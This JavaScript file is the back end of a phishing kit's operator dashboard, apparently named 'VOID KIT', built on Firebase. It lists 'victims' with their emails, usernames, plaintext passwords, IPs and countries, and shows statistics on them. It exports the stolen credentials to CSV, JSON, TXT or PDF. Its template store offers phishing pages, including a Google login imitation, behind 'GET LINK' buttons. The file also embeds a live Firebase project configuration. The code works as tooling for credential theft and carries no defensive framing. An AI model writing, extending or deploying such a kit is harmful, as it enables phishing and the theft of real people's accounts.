// ============================================================
// ⚙  FIREBASE CONFIG — Replace with your own from Firebase Console
// ============================================================
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
import {
  getAuth, signInWithEmailAndPassword, createUserWithEmailAndPassword,
  signOut, onAuthStateChanged, updateProfile, updatePassword,
  reauthenticateWithCredential, EmailAuthProvider, sendPasswordResetEmail,
  deleteUser
} from "https://www.gstatic.com/firebasejs/10.12.0/firebase-auth.js";
import {
  getFirestore, collection, addDoc, getDocs, deleteDoc,
  doc, onSnapshot, query, orderBy, serverTimestamp, Timestamp
} from "https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js";

// For Firebase JS SDK v7.20.0 and later, measurementId is optional
const firebaseConfig = {
  apiKey: "AIzaSyAbJ-KqDDA9B9wITQpi25XPndCGgT4qmyU",
  authDomain: "mrvoid-kit.firebaseapp.com",
  projectId: "mrvoid-kit",
  storageBucket: "mrvoid-kit.firebasestorage.app",
  messagingSenderId: "819971579036",
  appId: "1:819971579036:web:13a8c9664b8be10435e159",
  measurementId: "G-R9GG8W5336"
};
// ============================================================
const app = initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);

// ============ GLOBALS ============
let currentUser = null;
let victims = [];
let sortKey = 'date';
let pendingDeleteId = null;
let termHistory = [];
let termHistIdx = -1;
let avatarDataURL = null;

// ============ LOAD ANIMATION ============
const loadBar = document.getElementById('loadBar');
const loadText = document.getElementById('loadText');
const loadOverlay = document.getElementById('loadOverlay');
let loadPct = 0;
const loadSteps = ['CONNECTING TO FIREBASE...','INITIALIZING AUTH...','LOADING MODULES...','READY.'];
let loadStep = 0;
const loadInterval = setInterval(() => {
  loadPct = Math.min(loadPct + Math.random() * 20, 90);
  loadBar.style.width = loadPct + '%';
  if (loadPct > (loadStep+1)*22 && loadStep < 3) { loadText.textContent = loadSteps[++loadStep]; }
}, 200);

// ============ AUTH STATE ============
onAuthStateChanged(auth, user => {
  clearInterval(loadInterval);
  loadBar.style.width = '100%';
  setTimeout(() => {
    loadOverlay.classList.add('hidden');
    if (user) {
      currentUser = user;
      enterDash();
    } else {
      showScreen('loginScreen');
    }
  }, 400);
});

// ============ LOGIN / REGISTER ============
window.doLogin = async () => {
  const email = document.getElementById('loginEmail').value.trim();
  const pass = document.getElementById('loginPass').value;
  document.getElementById('loginErr').textContent = '';
  try {
    await signInWithEmailAndPassword(auth, email, pass);
  } catch(e) {
    document.getElementById('loginErr').textContent = '// ERR: ' + friendlyErr(e.code);
  }
};

window.doRegister = async () => {
  const name = document.getElementById('regName').value.trim();
  const email = document.getElementById('regEmail').value.trim();
  const pass = document.getElementById('regPass').value;
  document.getElementById('regErr').textContent = '';
  try {
    const cred = await createUserWithEmailAndPassword(auth, email, pass);
    if(name) await updateProfile(cred.user, {displayName: name});
  } catch(e) {
    document.getElementById('regErr').textContent = '// ERR: ' + friendlyErr(e.code);
  }
};

window.doLogout = async () => {
  await signOut(auth);
  victims = [];
  showScreen('loginScreen');
  toast('SESSION TERMINATED');
};

window.switchToRegister = () => {
  document.getElementById('loginForm').style.display = 'none';
  document.getElementById('registerForm').style.display = '';
};
window.switchToLogin = () => {
  document.getElementById('registerForm').style.display = 'none';
  document.getElementById('loginForm').style.display = '';
};

// ============ DASH INIT ============
function enterDash() {
  showScreen('dashScreen');
  const u = auth.currentUser;
  const name = u.displayName || u.email.split('@')[0];
  document.getElementById('sidebarUser').textContent = name.toUpperCase();
  document.getElementById('infoNode').textContent = u.uid.slice(0,8).toUpperCase();
  updateAccountPage();
  loadVictims();
  startClock();
  bootTerminal();
  showPage('homePage', document.querySelector('[data-page="homePage"]'));
}

// ============ VICTIMS — FIRESTORE ============
function loadVictims() {
  const q = query(collection(db, 'victims'), orderBy('createdAt', 'desc'));
  onSnapshot(q, snap => {
    victims = snap.docs.map(d => ({id: d.id, ...d.data()}));
    renderVictims();
    updateStats();
  }, err => {
    // Fallback if rules block or demo mode
    console.warn('Firestore:', err.message);
  });
}

function updateStats() {
  document.getElementById('statVictims').textContent = victims.length;
  const ips = new Set(victims.map(v=>v.ip).filter(Boolean));
  const ctrs = new Set(victims.map(v=>v.country).filter(Boolean));
  document.getElementById('statIPs').textContent = ips.size;
  document.getElementById('statCountries').textContent = ctrs.size;
  const today = new Date().toISOString().slice(0,10);
  const tod = victims.filter(v => {
    if(!v.date) return false;
    return v.date.slice(0,10) === today || (v.createdAt?.toDate?.()?.toISOString?.()?.slice(0,10) === today);
  }).length;
  document.getElementById('statToday').textContent = tod;
}

window.renderVictims = () => {
  const search = document.getElementById('searchVictims').value.toLowerCase();
  let list = [...victims];
  if(search) list = list.filter(v =>
    [v.email,v.username,v.ip,v.country,v.password].some(f => f && f.toLowerCase().includes(search))
  );
  list.sort((a,b) => {
    if(sortKey==='date') return (b.createdAt?.seconds||0)-(a.createdAt?.seconds||0);
    return (a[sortKey]||'').localeCompare(b[sortKey]||'');
  });
  const tbody = document.getElementById('victimsBody');
  if(list.length===0){ tbody.innerHTML=''; document.getElementById('noVictims').style.display=''; return; }
  document.getElementById('noVictims').style.display='none';
  tbody.innerHTML = list.map((v,i) => {
    const dt = v.createdAt?.toDate?.() || (v.date ? new Date(v.date) : new Date());
    const dateStr = dt.toLocaleDateString('en-GB');
    const timeStr = dt.toLocaleTimeString('en-GB');
    return `<tr>
      <td style="color:var(--text-dim)">${i+1}</td>
      <td class="td-email">${esc(v.email||'—')}</td>
      <td>${esc(v.username||'—')}</td>
      <td class="td-pass">${esc(v.password||'—')}</td>
      <td class="td-ip">${esc(v.ip||'—')}</td>
      <td>${esc(v.country||'—')}</td>
      <td style="color:var(--text-dim)">${dateStr}</td>
      <td style="color:var(--text-dim)">${timeStr}</td>
      <td><button class="btn-del" onclick="promptDelete('${v.id}')">DEL</button></td>
    </tr>`;
  }).join('');
};

window.setSort = (key, el) => {
  sortKey = key;
  document.querySelectorAll('.sort-btn').forEach(b => b.classList.remove('active'));
  el.classList.add('active');
  renderVictims();
};

window.promptDelete = (id) => {
  pendingDeleteId = id;
  openModal('deleteModal');
};
document.getElementById('confirmDelBtn').onclick = async () => {
  if(!pendingDeleteId) return;
  try {
    await deleteDoc(doc(db, 'victims', pendingDeleteId));
    toast('RECORD DELETED');
  } catch(e){ toast('DELETE FAILED: '+e.message, true); }
  closeModal('deleteModal');
  pendingDeleteId = null;
};

window.addDemoVictim = async () => {
  const demos = ['alice@example.com','bob@test.net','charlie@mail.org','diana@corp.io'];
  const countries = ['US','GB','DE','FR','JP','BR','CA','AU'];
  const r = demos[Math.floor(Math.random()*demos.length)];
  try {
    await addDoc(collection(db, 'victims'), {
      email: r,
      username: r.split('@')[0],
      password: 'p@ss' + Math.floor(Math.random()*9999),
      ip: `${rnd(255)}.${rnd(255)}.${rnd(255)}.${rnd(255)}`,
      country: countries[Math.floor(Math.random()*countries.length)],
      date: new Date().toISOString(),
      createdAt: serverTimestamp()
    });
    toast('DEMO RECORD ADDED');
  } catch(e){ toast('FIRESTORE NOT CONFIGURED — set up rules',true); }
};

// ============ ACCOUNT ============
function updateAccountPage() {
  const u = auth.currentUser;
  if(!u) return;
  const name = u.displayName || u.email.split('@')[0];
  document.getElementById('profileName').textContent = name;
  document.getElementById('profileEmail').textContent = u.email;
  document.getElementById('editName').value = u.displayName || '';
  document.getElementById('avatarInitial').textContent = name[0].toUpperCase();
  if(u.photoURL){ 
    document.getElementById('avatarImg').src = u.photoURL;
    document.getElementById('avatarImg').style.display = '';
    document.getElementById('avatarInitial').style.display = 'none';
  }
}

window.handleAvatar = (e) => {
  const file = e.target.files[0];
  if(!file) return;
  const reader = new FileReader();
  reader.onload = ev => {
    avatarDataURL = ev.target.result;
    document.getElementById('avatarImg').src = avatarDataURL;
    document.getElementById('avatarImg').style.display = '';
    document.getElementById('avatarInitial').style.display = 'none';
  };
  reader.readAsDataURL(file);
};

window.saveProfile = async () => {
  const name = document.getElementById('editName').value.trim();
  const msg = document.getElementById('profileMsg');
  try {
    const upd = {};
    if(name) upd.displayName = name;
    if(avatarDataURL) upd.photoURL = avatarDataURL;
    await updateProfile(auth.currentUser, upd);
    updateAccountPage();
    document.getElementById('sidebarUser').textContent = (name || auth.currentUser.email.split('@')[0]).toUpperCase();
    msg.innerHTML = '<div class="msg-ok">// PROFILE UPDATED</div>';
    toast('PROFILE SAVED');
  } catch(e){ msg.innerHTML = `<div class="msg-err">// ERR: ${e.message}</div>`; }
};

window.sendResetLink = async () => {
  try {
    await sendPasswordResetEmail(auth, auth.currentUser.email);
    toast('RESET EMAIL SENT TO ' + auth.currentUser.email.toUpperCase());
  } catch(e){ toast('FAILED: '+e.message, true); }
};

window.changePassword = async () => {
  const cur = document.getElementById('curPass').value;
  const nw = document.getElementById('newPass').value;
  const msg = document.getElementById('passMsg');
  if(!cur||!nw){ msg.innerHTML='<div class="msg-err">// FILL BOTH FIELDS</div>'; return; }
  try {
    const cred = EmailAuthProvider.credential(auth.currentUser.email, cur);
    await reauthenticateWithCredential(auth.currentUser, cred);
    await updatePassword(auth.currentUser, nw);
    msg.innerHTML='<div class="msg-ok">// PASSWORD UPDATED</div>';
    document.getElementById('curPass').value='';
    document.getElementById('newPass').value='';
    toast('PASSWORD CHANGED');
  } catch(e){ msg.innerHTML=`<div class="msg-err">// ERR: ${friendlyErr(e.code)}</div>`; }
};

document.getElementById('confirmDelAccBtn').onclick = async () => {
  const pass = document.getElementById('delAccPass').value;
  try {
    const cred = EmailAuthProvider.credential(auth.currentUser.email, pass);
    await reauthenticateWithCredential(auth.currentUser, cred);
    await deleteUser(auth.currentUser);
    closeModal('deleteAccModal');
    toast('ACCOUNT DELETED');
  } catch(e){ toast('ERR: '+friendlyErr(e.code), true); }
};

// ============ SETTINGS ============
window.setTheme = (t, el) => {
  document.documentElement.setAttribute('data-theme', t==='dark'?'':t);
  document.querySelectorAll('.swatch').forEach(s => s.classList.remove('active'));
  el.classList.add('active');
  localStorage.setItem('theme', t);
};

window.exportData = (fmt) => {
  if(!victims.length){ toast('NO DATA TO EXPORT', true); return; }
  const rows = victims.map(v => {
    const dt = v.createdAt?.toDate?.() || new Date(v.date||Date.now());
    return {
      email: v.email||'', username: v.username||'', password: v.password||'',
      ip: v.ip||'', country: v.country||'',
      date: dt.toLocaleDateString('en-GB'), time: dt.toLocaleTimeString('en-GB')
    };
  });

  if(fmt==='csv'){
    const hdr = 'EMAIL,USERNAME,PASSWORD,IP,COUNTRY,DATE,TIME\n';
    const body = rows.map(r=>Object.values(r).map(v=>`"${v}"`).join(',')).join('\n');
    download('victims.csv', hdr+body, 'text/csv');
  } else if(fmt==='json'){
    download('victims.json', JSON.stringify(rows, null, 2), 'application/json');
  } else if(fmt==='txt'){
    const lines = rows.map(r => `EMAIL: ${r.email} | USER: ${r.username} | PASS: ${r.password} | IP: ${r.ip} | COUNTRY: ${r.country} | ${r.date} ${r.time}`).join('\n');
    download('victims.txt', lines, 'text/plain');
  } else if(fmt==='pdf'){
    exportPDF(rows);
    return;
  }
  toast('EXPORT COMPLETE: ' + fmt.toUpperCase());
};

function exportPDF(rows) {
  const win = window.open('', '_blank');
  win.document.write(`<html><head><title>Victims Export</title>
  <style>body{font-family:monospace;background:#070b0f;color:#00ff99;padding:20px;}
  table{border-collapse:collapse;width:100%;}th,td{border:1px solid #1a2a3a;padding:8px;font-size:11px;}
  th{background:#0d1117;color:#00c8ff;}tr:nth-child(even){background:#0a0f14;}
  h2{color:#00ff99;letter-spacing:.3em;}</style></head>
  <body><h2>VICTIMS DATABASE EXPORT</h2>
  <p style="color:#4a6a5a;font-size:11px;">Generated: ${new Date().toLocaleString()}</p>
  <table><tr><th>EMAIL</th><th>USERNAME</th><th>PASSWORD</th><th>IP</th><th>COUNTRY</th><th>DATE</th><th>TIME</th></tr>
  ${rows.map(r=>`<tr><td>${r.email}</td><td>${r.username}</td><td>${r.password}</td><td>${r.ip}</td><td>${r.country}</td><td>${r.date}</td><td>${r.time}</td></tr>`).join('')}
  </table></body></html>`);
  win.document.close();
  setTimeout(()=>{win.print();},500);
  toast('PDF PRINT DIALOG OPENED');
}

// ============ TERMINAL ============
const CMDS = {
  help: () => [
    '  AVAILABLE COMMANDS:',
    '  help         — show this help',
    '  whoami       — current user info',
    '  victims      — victims count',
    '  stats        — database statistics',
    '  clear        — clear terminal',
    '  logout       — end session',
    '  ping         — test connection',
    '  date         — current date/time',
    '  ver          — system version',
  ],
  whoami: () => {
    const u = auth.currentUser;
    return [
      `  UID:    ${u?.uid}`,
      `  EMAIL:  ${u?.email}`,
      `  NAME:   ${u?.displayName || 'not set'}`,
      `  SINCE:  ${u?.metadata?.creationTime}`,
    ];
  },
  victims: () => [`  TOTAL VICTIMS: ${victims.length}`],
  stats: () => {
    const ips = new Set(victims.map(v=>v.ip).filter(Boolean));
    const ctrs = new Set(victims.map(v=>v.country).filter(Boolean));
    return [
      `  TOTAL:     ${victims.length}`,
      `  UNIQUE IPs:${ips.size}`,
      `  COUNTRIES: ${ctrs.size}`,
    ];
  },
  clear: () => { document.getElementById('termOutput').innerHTML=''; return []; },
  logout: () => { doLogout(); return ['  SESSION TERMINATED...']; },
  ping: () => ['  PONG — FIREBASE REACHABLE'],
  date: () => [`  ${new Date().toString()}`],
  ver: () => ['  VOID KIT v2.1.0 — build 2025.01'],
};

function bootTerminal() {
  const o = document.getElementById('termOutput');
  const u = auth.currentUser;
  const lines = [
    '<span class="info">VOID KIT SECURE TERMINAL v2.1</span>',
    '<span class="out">━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>',
    `<span class="out">  Logged in as: <span style="color:var(--accent)">${u?.email}</span></span>`,
    `<span class="out">  Session started: ${new Date().toLocaleString()}</span>`,
    '<span class="out">  Type \'help\' for available commands.</span>',
    '<span class="out">━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>',
    ''
  ];
  o.innerHTML = lines.map(l=>`<div class="term-line">${l}</div>`).join('');
  document.getElementById('termPrompt').textContent = `${u?.displayName||'root'}@sys:~$`;
}

window.handleTermKey = (e) => {
  const inp = document.getElementById('termInput');
  if(e.key === 'Enter'){
    const cmd = inp.value.trim().toLowerCase();
    inp.value = '';
    if(!cmd) return;
    termHistory.unshift(cmd);
    termHistIdx = -1;
    const o = document.getElementById('termOutput');
    const u = auth.currentUser;
    const prompt = u?.displayName||'root';
    appendTerm(`<span class="prompt">${prompt}@sys:~$</span> <span class="cmd">${esc(cmd)}</span>`);
    if(CMDS[cmd]){
      const out = CMDS[cmd]();
      out.forEach(l => appendTerm(`<span class="out">${esc(l)}</span>`));
    } else {
      appendTerm(`<span class="err">bash: ${esc(cmd)}: command not found</span>`);
    }
    appendTerm('');
    o.scrollTop = o.scrollHeight;
  } else if(e.key === 'ArrowUp'){
    if(termHistIdx < termHistory.length-1){ termHistIdx++; inp.value = termHistory[termHistIdx]||''; }
    e.preventDefault();
  } else if(e.key === 'ArrowDown'){
    if(termHistIdx > 0){ termHistIdx--; inp.value = termHistory[termHistIdx]||''; }
    else{ termHistIdx=-1; inp.value=''; }
    e.preventDefault();
  }
};

function appendTerm(html){
  const o = document.getElementById('termOutput');
  const d = document.createElement('div');
  d.className = 'term-line';
  d.innerHTML = html;
  o.appendChild(d);
}

// ============ CLOCK ============
function startClock(){
  function tick(){
    const now = new Date();
    document.getElementById('clock').textContent =
      now.toTimeString().slice(0,8);
  }
  tick(); setInterval(tick,1000);
}

// ============ HELPERS ============
window.showPage = (pid, el) => {
  document.querySelectorAll('.page').forEach(p=>p.classList.remove('active'));
  document.querySelectorAll('.nav-item').forEach(n=>n.classList.remove('active'));
  document.getElementById(pid).classList.add('active');
  if(el) el.classList.add('active');
  const names = {homePage:'HOME',victimsPage:'VICTIMS',accountPage:'MY ACCOUNT',settingsPage:'SETTINGS'};
  document.getElementById('topbarPath').textContent = names[pid]||pid;
  if(pid==='accountPage') updateAccountPage();
};

function showScreen(id){
  document.querySelectorAll('.screen').forEach(s=>s.classList.remove('active'));
  document.getElementById(id).classList.add('active');
}

window.openModal = (id) => document.getElementById(id).classList.add('open');
window.closeModal = (id) => document.getElementById(id).classList.remove('open');

function toast(msg, err=false){
  const t = document.getElementById('toast');
  t.textContent = msg;
  t.className = 'toast' + (err?' error':'');
  t.classList.add('show');
  setTimeout(()=>t.classList.remove('show'), 3000);
}

function esc(s){ return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
function rnd(n){ return Math.floor(Math.random()*n); }
function download(name, content, type){
  const a = document.createElement('a');
  a.href = URL.createObjectURL(new Blob([content], {type}));
  a.download = name; a.click();
}

function friendlyErr(code){
  const m = {
    'auth/invalid-email': 'INVALID EMAIL FORMAT',
    'auth/user-not-found': 'USER NOT FOUND',
    'auth/wrong-password': 'WRONG PASSWORD',
    'auth/email-already-in-use': 'EMAIL ALREADY REGISTERED',
    'auth/weak-password': 'PASSWORD TOO WEAK (min 6 chars)',
    'auth/invalid-credential': 'INVALID CREDENTIALS',
    'auth/too-many-requests': 'TOO MANY ATTEMPTS — TRY LATER',
    'auth/network-request-failed': 'NETWORK ERROR',
    'auth/requires-recent-login': 'RE-LOGIN REQUIRED FOR THIS ACTION',
  };
  return m[code] || code;
}

// ===== RESTORE THEME =====
const saved = localStorage.getItem('theme');
if(saved && saved!=='dark') { document.documentElement.setAttribute('data-theme',saved); }

 // ================== TEMPLATE STORE ==================

const siteTemplates = [
  {
    name: "Login Page",
    desc: "Standard login page",
    image: "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='100%25' height='100%25' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' fill='%23222'/%3E%3Ctext x='50' y='55' font-family='monospace' font-size='14' fill='%2300ff99' text-anchor='middle'%3ELOGIN%3C/text%3E%3C/svg%3E",
    tags: ["login", "standard"],
    link: "sites/login.html"
  },
  {
    name: "Google Login",
    desc: "Google styled login page",
    image: "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='100%25' height='100%25' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' fill='%234285F4'/%3E%3Ctext x='50' y='55' font-family='sans-serif' font-size='14' fill='white' text-anchor='middle'%3EGoogle%3C/text%3E%3C/svg%3E",
    tags: ["login", "google"],
    link: "sites/google.html"
  }
];

window.renderSites = () => {

  const grid = document.getElementById('sitesGrid');
  const search =
    document.getElementById('siteSearch').value.toLowerCase();

  const filtered = siteTemplates.filter(site =>
    (
      site.name +
      site.desc +
      site.tags.join(' ')
    ).toLowerCase().includes(search)
  );

  grid.innerHTML = filtered.map(site => `
    <div class="site-card">

      <img class="site-preview" src="${site.image}" />

      <div class="site-content">

        <div class="site-title">
          ${site.name}
        </div>

        <div class="site-desc">
          ${site.desc}
        </div>

        <div class="site-tags">
          ${site.tags.map(t =>
            `<div class="site-tag">${t}</div>`
          ).join('')}
        </div>

        <button
          class="site-btn"
          onclick="window.open('${site.link}','_blank')"
        >
          GET LINK
        </button>

      </div>

    </div>
  `).join('');
};

// render when opening page
setTimeout(() => {
  if(document.getElementById('sitesGrid')){
    renderSites();
  }
}, 1000);